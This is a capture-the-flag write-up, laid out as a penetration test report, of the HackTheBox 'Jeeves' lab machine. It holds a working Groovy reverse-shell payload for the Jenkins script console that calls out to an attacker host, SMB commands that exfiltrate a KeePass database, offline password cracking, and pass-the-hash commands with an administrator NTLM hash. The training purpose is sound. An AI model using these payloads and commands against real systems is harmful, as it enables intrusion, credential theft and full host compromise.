# HTB Jeeves - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-1-19

---

## 0. Lesson Learned

If flags and files don't exist when they should, always run `dir /R` to check for hidden data attached to files as NTFS supports **alternate data streams**.

**CrackMapExec:** SMB/AD enum + credential validation + light command exec (legacy, still seen).

**NetExec:** Modern CME replacement; fast SMB/AD enum, cred spraying, tells you where creds work.

**Evil-WinRM:** PowerShell shell over WinRM; works with non-admin creds if allowed, clean and stable.

**PsExec:** SMB service-based exec; requires admin, drops you straight into SYSTEM.

---

## 1. Executive Summary

A penetration test was performed against the target host *Jeeves*. Multiple weaknesses were identified, including exposed administrative services, insecure credential storage, and improper handling of sensitive data. These issues enabled and attacker to gain initial access via a Jenkins service, extract stored credentials, reuse administrator hashes, and escalate privileges to SYSTEM. Full compromise of the host was achieved, including retrieval of user and root proof files.

---

## 2. Scope

- **Target:** 10.129.228.112
- **Environment:** HackTheBox Jeeves (Retired Machine)
- **Testing Window:** 2026-1-15 to 2026-1-16
- **Objective:** Obtain user-level and root-level access

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

An initial full TCP port scan was performed to identify exposed services.

```
nmap -p- -sCV 10.129.228.112 -T4 -oA jeeves_initial
```

This identified multiple open services, including HTTP (80), SMB (445), MSRPC (135), and a Jetty-based HTTP service on port 50000.

---

## 5. Enumeration

### Web Enumeration

Directory brute forcing was conducted against the HTTP services with both short and longer wordlists and looking for html extensions.

```
gobuster dir -u http://10.129.228.112 -w /usr/share/wordlists/dirb/common.txt --no-error

gobuster dir -u http://10.129.228.112:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html --no-error
```

This revealed an `/askjeeves` directory hosting a Jenkins dashboard.

### SMB Enumeration

SMB enumeration was attempted to identify accessible shares and authentication behavior.

```
smbclient -L //10.129.228.112 -N

smbclient -L //10.129.228.112 -U anonymous
```

SMB access was restricted, but weak security settings were later leveraged with valid credentials.

---

## 6. Initial Access

The Jenkins Script Console was accessible and allowed arbitrary Groovy script execution. A reverse shell was executed through the console.

```
String host="<attacker-ip>"; int port=<listener-port>; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

This resulted in a shell as the `jeeves\kohsuke` user.

---

## 7. Post-Exploitation

### Local Enumeration

Privilege and system enumeration was performed:

```
whoami

whoami /priv

systeminfo
```

This revealed Windows 10 Pro Build 10586 with 10 Hotfixes installed and `SeImpersonatePrivilege` enabled. A KeePass database was discovered in the user's Documents directory:

```
C:\Users\kohsuke\Documents\CEH.kdbx

```

Command to find any KeePass file on Windows PowerShell (Not Used):

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

### File Exfiltration

An SMB server was started on the attacker machine to exfiltrate the database:

```
impacket-smbserver TMP . -smb2support -username user -password pass
```

The KeePass file was copied from the Windows machine to the SMB server:

```
net use M: \\<attacker-ip>\TMP /user:user pass

copy C:\Users\kohsuke\Documents\CEH.kdbx M:\

net use M: /delete
```

### Credential Access

The KeePass database was cracked offline using John the Ripper:

```
keepass2john CEH.kdbx > keepasshash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt keepasshash.txt
```

This revealed the database password `moonshine1`.

A KeePass CLI tool `kpcli` was installed:

```
sudo apt install kpcli -y
```

Credentials and NTLM hashes were extracted using `kpcli`:

```
kpcli --kdb CEH.kdbx

cd CEH/

show -f 0
show -f 1
...
show -f 7
```

This revealed multiple credentials (see [Appendix](/jeeves/jeeves.md#11-appendix)). The NTLM hash associated with the local Administrator account was reused to authenticate via SMB, resulting in SYSTEM-level access.

---

## 8. Privilege Escalation

Recovered NTLM hashes were tested for administrator access:

```
netexec smb 10.129.228.112 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

Administrator access was obtained using pass-the-hash:

```
impacket-psexec administrator@10.129.228.112 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\kohsuke\Desktop\user.txt
```

**Root Flag**: *REDACTED*

The root flag was hidden using NTFS Alternate Data Streams.

```
cd C:\Users\Administrator\Desktop

dir /R

more < hm.txt:root.txt
```

---

## 10. Findings & Recommendations

1. **Unrestriced Jenkins Script Console allowing arbitrary code execution:** 

Restrict Jenkins administrative access, disable the script console where not required, and enforce role-based access control.

2. **Sensitive credentials stored insecurely in a user-accessible KeePass database:** 

Store credentials securely using enterprise-grade secret management solutions and restrict access to sensitive credential files.

3. **Reusable NTLM administrator hashes enabled pass-the-hash authentication and privilege escalation:**

Disable NTLM authentication where possible, enforce Kerberos, and implement credential guard protections.

4. **Weak SMB security configuration allowed authentication without enforced message signing:** 

Enforce SMB signing and harden SMB configurations to prevent relay and credential abuse attacks.

5. **Sensitive data was hidden using NTFS Alternate Data Streams, bypassing standard file visibility:**

Monitor for NTFS ADS usage, restrict unnecessary file write permissions, and include ADS checks in security audits.

---

## 11. Appendix

### Recovered Credentials (Source: KeePass DB)

| Title | Username | Credential Type | Usage |
|-------|----------|-----------------|-------|
| Backup stuff | ? | NTLM Hash | Used for Pass-The-Hash -> SYSTEM |
| Bank of America | Michael321 | Password | Not used |
| DC Recovery PW | administrator | Password | Not used |
| EC-Council | hackerman123 | Password | Not used |
| It’s a secret | admin | Password | Not used |
| Keys to the kingdom | bob | Password | Not used |
| Walmart.com | anonymous | Password | Not used |

### Resources Used

Groovy Script Reverse Shell -
[https://gist.github.com/rootsecdev/273f22a747753e2b17a2fd19c248c4b7](https://gist.github.com/rootsecdev/273f22a747753e2b17a2fd19c248c4b7)

Moving Files from Windows to Kali - 
[https://duckwrites.medium.com/3-cool-ways-to-move-files-from-windows-to-kali-42973ec35279](https://duckwrites.medium.com/3-cool-ways-to-move-files-from-windows-to-kali-42973ec35279)